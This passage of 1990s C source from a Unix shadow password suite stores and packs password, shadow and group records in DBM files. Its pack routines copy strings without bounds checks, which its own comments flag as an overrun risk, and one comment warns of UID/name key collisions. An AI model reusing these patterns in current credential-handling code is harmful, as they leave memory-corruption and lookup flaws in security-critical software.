	len = sgr_pack (sgr, data);

	if (len <= GRP_FRAG) {
		content.dsize = len;
		content.dptr = data;

		key.dsize = strlen (sgr->sg_name);
		key.dptr = sgr->sg_name;
		if (dbm_store (sg_dbm, key, content, DBM_REPLACE))
			return 0;
	} else {
		content.dsize = sizeof cnt;
		content.dptr = (char *) &cnt;
		cnt = (len + (GRP_FRAG-1)) / GRP_FRAG;

		key.dsize = strlen (sgr->sg_name);
		key.dptr = sgr->sg_name;
		if (dbm_store (sg_dbm, key, content, DBM_REPLACE))
			return 0;

		for (cp = data, i = 0;i < cnt;i++) {
			content.dsize = len > GRP_FRAG ? GRP_FRAG:len;
			len -= content.dsize;
			content.dptr = cp;
			cp += content.dsize;

			key.dsize = sizeof i + strlen (sgr->sg_name);
			key.dptr = sgrpkey;
			memcpy (sgrpkey, (char *) &i, sizeof i);
			strcpy (sgrpkey + sizeof i, sgr->sg_name);
			if (dbm_store (sg_dbm, key, content, DBM_REPLACE))
				return 0;
		}
	}
	return 1;
}

/*
 * sg_dbm_remove
 *
 * Deletes the DBM shadow group file entries, if they exist.
 */

int
sg_dbm_remove (name)
	const char *name;
{
	datum	key;
	datum	content;
	char	grpkey[60];
	int	i;
	int	cnt;
	int	errors = 0;
	static	int	once;

	if (! once) {
		if (! sg_dbm)
			setsgent ();

		once++;
	}
	if (! sg_dbm)
		return 0;

	key.dsize = strlen (name);
	key.dptr = name;
	content = dbm_fetch (sg_dbm, key);
	if (content.dptr == 0)
		++errors;
	else {
		if (content.dsize == sizeof (int)) {
			memcpy ((char *) &cnt, content.dptr, sizeof cnt);

			for (i = 0;i < cnt;i++) {
				key.dsize = sizeof i + strlen (name);
				key.dptr = grpkey;
				memcpy (grpkey, (char *) &i, sizeof i);
				strcpy (grpkey + sizeof i, name);
				if (dbm_delete (sg_dbm, key))
					++errors;
			}
		} else {
			if (dbm_delete (sg_dbm, key))
				++errors;
		}
	}
	return errors ? 0:1;
}

int
sg_dbm_present()
{
	return (access(SGROUP_PAG_FILE, 0) == 0);
}
#endif /*} SHADOWGRP && NDBM */
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#if defined(DBM) || defined(NDBM) /*{*/

#include "rcsid.h"
RCSID("$Id: pwdbm.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <sys/types.h>
#include <stdio.h>
#include <pwd.h>
#include "prototypes.h"
#include "defines.h"

#ifdef	DBM
#include <dbm.h>
#endif
#ifdef	NDBM
#include <ndbm.h>
extern	DBM	*pw_dbm;
#endif

/*
 * pw_dbm_update
 *
 * Updates the DBM password files, if they exist.
 */

int
pw_dbm_update (pw)
	const struct passwd *pw;
{
	datum	key;
	datum	content;
	char	data[BUFSIZ];
	int	len;
	static	int	once;

	if (! once) {
#ifdef	NDBM
		if (! pw_dbm)
			setpwent ();
#else
		setpwent ();
#endif
		once++;
	}
#ifdef	DBM
	strcpy (data, PASSWD_FILE);
	strcat (data, ".pag");
	if (access (data, 0))
		return 0;
#endif
#ifdef	NDBM
	if (! pw_dbm)
		return 0;
#endif
	len = pw_pack (pw, data);
	content.dsize = len;
	content.dptr = data;

	key.dsize = strlen (pw->pw_name);
	key.dptr = pw->pw_name;
#ifdef	DBM
	if (store (key, content))
		return 0;
#endif
#ifdef	NDBM
	if (dbm_store (pw_dbm, key, content, DBM_REPLACE))
		return 0;
#endif

	/*
	 * XXX - on systems with 16-bit UIDs (such as Linux/x86)
	 * name "aa" and UID 24929 will give the same key.  This
	 * happens only rarely, but code which only "works most
	 * of the time" is not good enough...
	 *
	 * This needs to be fixed in several places (pwdbm.c,
	 * grdbm.c, pwent.c, grent.c).  Fixing it will cause
	 * incompatibility with existing dbm files.
	 *
	 * Summary: don't use this stuff for now.  --marekm
	 */

	key.dsize = sizeof pw->pw_uid;
	key.dptr = (char *) &pw->pw_uid;
#ifdef	DBM
	if (store (key, content))
		return 0;
#endif
#ifdef	NDBM
	if (dbm_store (pw_dbm, key, content, DBM_REPLACE))
		return 0;
#endif
	return 1;
}

/*
 * pw_dbm_remove
 *
 * Removes the DBM password entry, if it exists.
 */

int
pw_dbm_remove (pw)
	const struct passwd *pw;
{
	datum	key;
	static	int	once;
	char	data[BUFSIZ];

	if (! once) {
#ifdef	NDBM
		if (! pw_dbm)
			setpwent ();
#else
		setpwent ();
#endif
		once++;
	}
#ifdef	DBM
	strcpy (data, PASSWD_FILE);
	strcat (data, ".pag");
	if (access (data, 0))
		return 0;
#endif
#ifdef	NDBM
	if (! pw_dbm)
		return 0;
#endif
	key.dsize = strlen (pw->pw_name);
	key.dptr = pw->pw_name;
#ifdef	DBM
	if (delete (key))
		return 0;
#endif
#ifdef	NDBM
	if (dbm_delete (pw_dbm, key))
		return 0;
#endif
	key.dsize = sizeof pw->pw_uid;
	key.dptr = (char *) &pw->pw_uid;
#ifdef	DBM
	if (delete (key))
		return 0;
#endif
#ifdef	NDBM
	if (dbm_delete (pw_dbm, key))
		return 0;
#endif
	return 1;
}

int
pw_dbm_present()
{
	return (access(PASSWD_PAG_FILE, 0) == 0);
}
#endif	/*} defined(NDBM) || defined(DBM) */
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#if defined(SHADOWPWD) && defined(NDBM)	/*{*/

#include "rcsid.h"
RCSID("$Id: spdbm.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <string.h>
#include <stdio.h>
#include "prototypes.h"
#include "defines.h"

#include <ndbm.h>
extern	DBM	*sp_dbm;

/*
 * sp_dbm_update
 *
 * Updates the DBM password files, if they exist.
 */

int
sp_dbm_update (sp)
struct	spwd	*sp;
{
	datum	key;
	datum	content;
	char	data[BUFSIZ];
	int	len;
	static	int	once;

	if (! once) {
		if (! sp_dbm)
			setspent ();

		once++;
	}
	if (! sp_dbm)
		return 0;

	len = spw_pack (sp, data);

	content.dsize = len;
	content.dptr = data;

	key.dsize = strlen (sp->sp_namp);
	key.dptr = sp->sp_namp;
	if (dbm_store (sp_dbm, key, content, DBM_REPLACE))
		return 0;

	return 1;
}

/*
 * sp_dbm_remove
 *
 * Updates the DBM password files, if they exist.
 */

int
sp_dbm_remove (user)
char	*user;
{
	datum	key;
	static	int	once;

	if (! once) {
		if (! sp_dbm)
			setspent ();

		once++;
	}
	if (! sp_dbm)
		return 0;

	key.dsize = strlen (user);
	key.dptr = user;
	if (dbm_delete (sp_dbm, key))
		return 0;

	return 1;
}

int
sp_dbm_present()
{
	return (access(SHADOW_PAG_FILE, 0) == 0);
}
#endif	/*} SHADOWPWD && NDBM */
/*
 * Copyright 1990, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: grpack.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <stdio.h>
#include <grp.h>

#include "defines.h"

int
gr_pack(group, buf)
	const struct group *group;
	char *buf;
{
	char	*cp;
	int	i;

	cp = buf;
	strcpy (cp, group->gr_name);
	cp += strlen (cp) + 1;

	strcpy (cp, group->gr_passwd);
	cp += strlen (cp) + 1;

	memcpy (cp, (const char *) &group->gr_gid, sizeof group->gr_gid);
	cp += sizeof group->gr_gid;

	for (i = 0;group->gr_mem[i];i++) {
		strcpy (cp, group->gr_mem[i]);
		cp += strlen (cp) + 1;
	}
	*cp++ = '\0';

	return cp - buf;
}

int
gr_unpack(buf, len, group)
	char *buf;
	int len;
	struct group *group;
{
	char	*org = buf;
	int	i;

	group->gr_name = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;

	group->gr_passwd = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;

	memcpy ((char *) &group->gr_gid, (char *) buf, sizeof group->gr_gid);
	buf += sizeof group->gr_gid;
	if (buf - org > len)
		return -1;

	for (i = 0;*buf && i < 1024;i++) {
		group->gr_mem[i] = buf;
		buf += strlen (buf) + 1;

		if (buf - org > len)
			return -1;
	}
	group->gr_mem[i] = (char *) 0;
	return 0;
}
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#ifdef	SHADOWGRP	/*{*/

#include "rcsid.h"
RCSID("$Id: gspack.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <stdio.h>
#include "defines.h"

/*
 * sgr_pack - convert a shadow group structure to a packed
 *	      shadow group record
 *
 *	sgr_pack takes the shadow group structure and packs
 *	the components in a record.  this record will be
 *	unpacked later by sgr_unpack.
 */

int
sgr_pack(sgrp, buf)
	const struct sgrp *sgrp;
	char *buf;
{
	char	*cp;
	int	i;

	/*
	 * The name and password are both easy - append each string
	 * to the buffer.  These are always the first two strings
	 * in a record.
	 */

	cp = buf;
	strcpy (cp, sgrp->sg_name);
	cp += strlen (cp) + 1;

	strcpy (cp, sgrp->sg_passwd);
	cp += strlen (cp) + 1;

	/*
	 * The arrays of administrators and members are slightly
	 * harder.  Each element is appended as a string, with a
	 * final '\0' appended to serve as a blank string.  The
	 * number of elements is not known in advance, so the
	 * entire collection of administrators must be scanned to
	 * find the start of the members.
	 */

	for (i = 0;sgrp->sg_adm[i];i++) {
		strcpy (cp, sgrp->sg_adm[i]);
		cp += strlen (cp) + 1;
	}
	*cp++ = '\0';

	for (i = 0;sgrp->sg_mem[i];i++) {
		strcpy (cp, sgrp->sg_mem[i]);
		cp += strlen (cp) + 1;
	}
	*cp++ = '\0';

	return cp - buf;
}

/*
 * sgr_unpack - convert a packed shadow group record to an
 *	        unpacked record
 *
 *	sgr_unpack converts a record which was packed by sgr_pack
 *	into the normal shadow group structure format.
 */

int
sgr_unpack(buf, len, sgrp)
	char *buf;
	int len;
	struct sgrp *sgrp;
{
	char	*org = buf;
	int	i;

	/*
	 * The name and password are both easy - they are the first
	 * two strings in the record.
	 */

	sgrp->sg_name = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;

	sgrp->sg_passwd = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;

	/*
	 * The administrators and members are slightly more difficult.
	 * The arrays are lists of strings.  Each list is terminated
	 * by a string of length zero.  This string is detected by
	 * looking for an initial character of '\0'.
	 */

	for (i = 0;*buf && i < 1024;i++) {
		sgrp->sg_adm[i] = buf;
		buf += strlen (buf) + 1;

		if (buf - org > len)
			return -1;
	}
	sgrp->sg_adm[i] = (char *) 0;
	if (! *buf)
		buf++;

	for (i = 0;*buf && i < 1024;i++) {
		sgrp->sg_mem[i] = buf;
		buf += strlen (buf) + 1;

		if (buf - org > len)
			return -1;
	}
	sgrp->sg_mem[i] = (char *) 0;

	return 0;
}
#endif /*}*/
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: pwpack.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <sys/types.h>
#include "defines.h"
#include <stdio.h>
#include <pwd.h>


/*
 * pw_pack - convert a (struct pwd) to a packed record
 * WARNING: buf must be large enough, no check for overrun!
 */

int
pw_pack(passwd, buf)
	const struct passwd *passwd;
	char *buf;
{
	char	*cp;

	cp = buf;
	strcpy (cp, passwd->pw_name);
	cp += strlen (cp) + 1;

	strcpy (cp, passwd->pw_passwd);
#ifdef	ATT_AGE
	if (passwd->pw_age[0]) {
		*cp++ = ',';
		strcat (cp, passwd->pw_age);
	}
#endif
	cp += strlen (cp) + 1;

	memcpy (cp, (const char *) &passwd->pw_uid, sizeof passwd->pw_uid);
	cp += sizeof passwd->pw_uid;

	memcpy (cp, (const char *) &passwd->pw_gid, sizeof passwd->pw_gid);
	cp += sizeof passwd->pw_gid;
#ifdef	BSD_QUOTA
	memcpy (cp, (const char *) &passwd->pw_quota, sizeof passwd->pw_quota);
	cp += sizeof passwd->pw_quota;
#endif
#ifdef	ATT_COMMENT
	if (passwd->pw_comment) {
		strcpy (cp, passwd->pw_comment);
		cp += strlen (cp) + 1;
	} else
		*cp++ = '\0';
#endif
	strcpy (cp, passwd->pw_gecos);
	cp += strlen (cp) + 1;

	strcpy (cp, passwd->pw_dir);
	cp += strlen (cp) + 1;

	strcpy (cp, passwd->pw_shell);
		cp += strlen (cp) + 1;

	return cp - buf;
}

/*
 * pw_unpack - convert a packed (struct pwd) record to a (struct pwd)
 */

int
pw_unpack(buf, len, passwd)
	char *buf;
	int len;
	struct passwd *passwd;
{
	char	*org = buf;
#ifdef	ATT_AGE
	char	*cp;
#endif

	bzero((char *) passwd, sizeof *passwd);

	passwd->pw_name = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;

	passwd->pw_passwd = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;

#ifdef	ATT_AGE
	if (cp = strchr (passwd->pw_passwd, ',')) {
		*cp++ = '\0';
		passwd->pw_age = cp;
	} else
		passwd->pw_age = "";
#endif

	memcpy ((void *) &passwd->pw_uid, (void *) buf, sizeof passwd->pw_uid);
	buf += sizeof passwd->pw_uid;
	if (buf - org > len)
		return -1;

	memcpy ((void *) &passwd->pw_gid, (void *) buf, sizeof passwd->pw_gid);
	buf += sizeof passwd->pw_gid;
	if (buf - org > len)
		return -1;

#ifdef	BSD_QUOTA
	memcpy ((void *) &passwd->pw_quota, (void *) buf,
		sizeof passwd->pw_quota);
	buf += sizeof passwd->pw_quota;
	if (buf - org > len)
		return -1;
#endif
#ifdef	ATT_COMMENT
	passwd->pw_comment = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;
#endif
	passwd->pw_gecos = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;

	passwd->pw_dir = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;

	passwd->pw_shell = buf;
	buf += strlen (buf) + 1;
	if (buf - org > len)
		return -1;

	return 0;
}
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>
#ifdef	SHADOWPWD	/*{*/

#include "rcsid.h"
RCSID("$Id: sppack.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <stdio.h>
#include <sys/types.h>
#include "defines.h"

int
spw_pack (spwd, buf)
	const struct spwd *spwd;
	char *buf;
{
	char	*cp;

	cp = buf;
	strcpy (cp, spwd->sp_namp);
	cp += strlen (cp) + 1;

	strcpy (cp, spwd->sp_pwdp);
	cp += strlen (cp) + 1;

	memcpy (cp, &spwd->sp_min, sizeof spwd->sp_min);
	cp += sizeof spwd->sp_min;

	memcpy (cp, &spwd->sp_max, sizeof spwd->sp_max);
	cp += sizeof spwd->sp_max;

	memcpy (cp, &spwd->sp_lstchg, sizeof spwd->sp_lstchg);
	cp += sizeof spwd->sp_lstchg;

	memcpy (cp, &spwd->sp_warn, sizeof spwd->sp_warn);
	cp += sizeof spwd->sp_warn;

	memcpy (cp, &spwd->sp_inact, sizeof spwd->sp_inact);
	cp += sizeof spwd->sp_inact;

	memcpy (cp, &spwd->sp_expire, sizeof spwd->sp_expire);
	cp += sizeof spwd->sp_expire;

	memcpy (cp, &spwd->sp_flag, sizeof spwd->sp_flag);
	cp += sizeof spwd->sp_flag;

	return cp - buf;
}

int
spw_unpack (buf, len, spwd)
	char *buf;
	int len;
	struct spwd *spwd;
{
	char	*org = buf;

	spwd->sp_namp = buf;
	buf += strlen (buf) + 1;

	spwd->sp_pwdp = buf;
	buf += strlen (buf) + 1;

	memcpy (&spwd->sp_min, buf, sizeof spwd->sp_min);
	buf += sizeof spwd->sp_min;

	memcpy (&spwd->sp_max, buf, sizeof spwd->sp_max);
	buf += sizeof spwd->sp_max;

	memcpy (&spwd->sp_lstchg, buf, sizeof spwd->sp_lstchg);
	buf += sizeof spwd->sp_lstchg;

	memcpy (&spwd->sp_warn, buf, sizeof spwd->sp_warn);
	buf += sizeof spwd->sp_warn;

	memcpy (&spwd->sp_inact, buf, sizeof spwd->sp_inact);
	buf += sizeof spwd->sp_inact;

	memcpy (&spwd->sp_expire, buf, sizeof spwd->sp_expire);
	buf += sizeof spwd->sp_expire;

	memcpy (&spwd->sp_flag, buf, sizeof spwd->sp_flag);
	buf += sizeof spwd->sp_flag;

	if (buf - org > len)
		return -1;

	return 0;
}
#endif	/*}*/
/*
 * Copyright 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>
#include <fcntl.h>

#include "rcsid.h"
RCSID("$Id: mkdir.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

/*
 * mkdir - create a directory
 *
 *	mkdir is provided for systems which do not include the mkdir()
 *	system call.
 */

int
mkdir (dir, mode)
	const char *dir;
	int mode;
{
	int status;

	if (fork ()) {
		while (wait (&status) != -1)
			;

		return status >> 8;
	}
	close (2);
	open ("/dev/null", O_WRONLY);
	umask (0777 & ~ mode);
	execl ("/bin/mkdir", "mkdir", dir, 0);
	_exit (128);
	/*NOTREACHED*/
}
/*
 * Copyright 1993 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
